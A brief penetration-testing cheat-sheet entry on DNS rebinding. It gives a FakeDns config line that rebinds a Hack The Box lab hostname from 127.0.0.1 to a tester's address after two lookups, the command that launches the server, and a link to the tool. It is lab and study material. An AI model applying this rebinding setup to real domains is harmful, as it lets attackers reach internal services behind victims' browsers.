# DNS Rebind Attacks
## Fake DNS

Config Sample
```vim
# DNS A Record, Rebinds after 2 DNS requests to the last IP
A 0xdf-employees.crossfit.htb 127.0.0.1 2%10.10.14.13
```

Command
```bash
/opt/FakeDns/fakedns.py -c fakedns.conf 
```

- [Crypt0s/FakeDns: A regular-expression based python MITM DNS server with support for DNS Rebinding attacks (github.com)](https://github.com/Crypt0s/FakeDns)